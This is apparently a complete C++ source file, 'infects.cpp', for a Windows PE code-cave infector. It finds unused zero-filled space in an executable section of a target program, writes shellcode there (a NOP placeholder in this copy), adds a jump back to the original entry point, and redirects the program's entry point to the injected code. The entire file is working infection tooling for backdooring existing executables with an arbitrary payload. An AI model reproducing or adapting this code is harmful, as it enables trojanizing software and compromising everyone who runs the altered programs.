#include "stdafx.h"
#include <iostream>
#include <stdio.h>
#include <windows.h>

#define JMP_LEN 5
#define DEBUG
#define REAL
using namespace std;

//
// Author : shmuel.yr
// infects.cpp
//

int main(int ac, char **av) {
#ifdef REAL
	if (ac < 2) {
		cout << "usage : " << av[0] << " <name_of_file>\n";
		return 1;
	}
#endif
	char *shellcode = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

	HANDLE hFile = CreateFileA(av[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile) {
		cout << "CreareFile error.";
		return 1;
	}

	HANDLE hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
	if (!hFileMap) {
		cout << "CreateFileMapping error." << GetLastError();
		return 1;
	}

	char *fileContant = (char *)MapViewOfFile(hFileMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
	if (!fileContant) {
		cout << "MapViewOfFile error." << GetLastError();
		return 1;
	}

	IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER*)fileContant;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		cout << "DOS header is not valid!";
		return 1;
	}

	IMAGE_NT_HEADERS *ntHeader = (IMAGE_NT_HEADERS*)(fileContant + dosHeader->e_lfanew);
	if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
		cout << "NT header is not valid!";
		return 1;
	}

	IMAGE_SECTION_HEADER *section = (IMAGE_SECTION_HEADER*)((char*)ntHeader + sizeof(IMAGE_NT_HEADERS));
	IMAGE_SECTION_HEADER *caveSection = section; // section structor of cave
	char *mem = 0;
	unsigned int caveSize = 0;
	int caveFouned = 0;
	int caveAddr = 0;



	for (unsigned int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++, section++) {
		if (section->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
#ifdef DEBUG
			cout << "[+] Section : " << section->Name << " is executable, look for unusage space..\n";;
#endif
			mem = fileContant + section->PointerToRawData;
			for (unsigned int j = 0; j < section->SizeOfRawData; j++) {
				while (*mem++ == 0) {
					j++, caveSize++;
				}

				if (caveSize >= (strlen(shellcode) + JMP_LEN + 4)) {
					caveAddr = j - caveSize;
					caveFouned = 1;
					caveSection = section;
					break;
				}
				else caveSize = 0;
			}
		}
		if (caveFouned) {
#ifdef DEBUG 
			cout << "\t[+] Founded " << caveSize << "byte in this section at offset : 0x" << hex << (unsigned int)(caveAddr) << "\n";
#endif
			break;
		}
	}

	if (!caveSize) {
		cout << "Couldnt find any free space..";
		exit(1);
	}
	


#ifdef DEBUG
	cout<< "[+] copy the shellcode to the cave..\n"
		<< "* virtual: " << ((ULONG32)caveAddr + (unsigned int)caveSection->VirtualAddress) << endl
		<< "* on disk : " << hex << (ULONG32)(caveAddr + (unsigned int)caveSection->PointerToRawData) << endl;
#endif

	memcpy((char *)caveAddr + (unsigned int)fileContant + (unsigned int)caveSection->PointerToRawData, shellcode, strlen(shellcode));

	char * ptr = (char *)caveAddr + (unsigned int)fileContant + (unsigned int)caveSection->PointerToRawData + strlen(shellcode);

#ifdef DEBUG
	cout << "[+] Generated JMP instruction..\n";
#endif
	*(ptr++) = 0xE9;
	*(DWORD*)ptr = (ULONG32)(ntHeader->OptionalHeader.AddressOfEntryPoint) - ((unsigned int)caveAddr + caveSection->VirtualAddress + strlen(shellcode) + JMP_LEN);

	DWORD size = (unsigned int)caveAddr + strlen(shellcode);
	if (caveSection->Misc.VirtualSize <= size)
		caveSection->Misc.VirtualSize = size;
#ifdef DEBUG
	cout << "[+] Change EP : " << endl;
	cout << "\t *EP : " << hex << (unsigned int)ptr << endl;
	cout << "\t *OEP : " << hex << ntHeader->OptionalHeader.AddressOfEntryPoint << endl;
#endif
	ntHeader->OptionalHeader.AddressOfEntryPoint = (ULONG32)(caveAddr + (unsigned int)caveSection->VirtualAddress);

	UnmapViewOfFile(fileContant);
	CloseHandle(hFileMap);
	CloseHandle(hFile);
	return 0;
}
